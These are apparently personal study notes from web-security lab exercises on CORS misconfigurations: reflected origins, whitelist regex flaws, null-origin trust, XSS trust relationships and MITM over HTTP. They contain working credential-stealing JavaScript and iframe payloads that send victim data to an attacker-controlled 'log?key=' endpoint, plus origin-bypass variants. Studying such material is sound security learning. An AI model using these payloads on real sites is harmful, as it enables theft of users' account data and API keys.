## Vulnerabilities
Overview
* Mistakes often made with how CORS is configured which leads to vulnerabilities

Server-Generated ACAO header from client-specified Origin header
* When applications just want to allow access to any website, they mirror the request origin in the response ACAO
* Can be an issue, especially if you have set ACAC to true
   	* Add origin header with random origin to see if it is reflected in the response, then try and exploit.
   	* Make naughty requests and relocate info to your malicious server.
* Naughty JS that uses CORS to retrieve Admin API key and uploads to exploit server:
var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='//malicious-website.com/log?key='+this.responseText;
   };  
   

Errors parsing Origin headers
* When Whitelist is employed, request host is checked against whitelist
* Mistakes can be made in the whitelist
   	* Some orgs allow access from all their subdomains (including non-existant ones)
   	* Done using regular expressions
* Try variations of an accepted website. E.G> normal-website.com
   	* hackersnormal-website.com
   	* normal-website.com.evil-user.net

Whitelisted null origin value
* Browsers send null value in origin when:
   	* Cross-sit redirects
   	* Requests from serialised data
   	* request using the file: protocol
   	* sandboxed cross-origin requests
* Some apps whitelist “null” origin
* TRY sending the null origin
   	* If you recieve the null ACAO back, it may have whitelisted null values?
   	* Then you use some scripting on exploit server to access API keys etc.
   	* contain null value in an iFrame to be sneaky (since iFrame origin is null)
      		* Put script inside of first iFrame bracket (script from above)
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script></script>"></iframe>     

<iframe sandbow="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://acb91f5b1eb139e0801918c6005b00c0.web-security-academy.net/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='https://ac0d1fe01ecb39a1801118e701aa00a3.web-security-academy.net/log?key='+encodeURIComponent(this.responseText);
   };  
</script>"
>
</iframe>

Exploiting XSS via CORS trust relationship
* Trust relationship developed between 2 origins
* if website trusts vulnerable website, can be dangerous for the safe websote
* Inject JS that uses CORS to steal info.

Breaking TLS with poorly configured CORS
* If HTTPS site trusts (whitelists) HTTP website, HTTP site can make a request for sensitive info
* Attack in position to intercept victim user's traffic can exploit CORS configuration to steal info
* STEPS (MITM):
   	* Victim HTTP request
   	* Attack injects redirection to http://trusted-subdomain.vulnerable-website.com
   	* victims browser follows redirect
   	* attacker intercepts http request, returns spoofed response w/ CORS request
   	* victim browser makes CORS request with new origin
   	* app allows request
Better Steps
* Play around with site and look for relationships between different sites
* Look for ACAC and ACAO
* If HTTPS request HTTP, make not of HTTP.
* Find a place where you want to gather details, intercept request
* Try variations of subdomain + attack or attack + subdomain to work out how the cors is configured (which URLS are whitelisted (regex)) and make this the origin.
* Find vulnerability in another area where you can inject (XSS?)
* Use JS on exploit server to exploit vuln (make sure to include doc.location with your naughty URL you used earlier
   	* Should take the form of: <script document.location="URL.com/<script>...</script>"</script>
   	* If it doesn't work, look at HTML encoding

Intranets and CORS without credentials
* CORS attacks often rely on ACAC True
   	* Allows the sending of cookies
* Often case you can't access intranet without credentials (IP blocking)
* BUT, internal websites often have lower security standards
* What if an authenticated user accesses external website THEN an internal one?
   	* Could MITM this and get credentials to access internet.

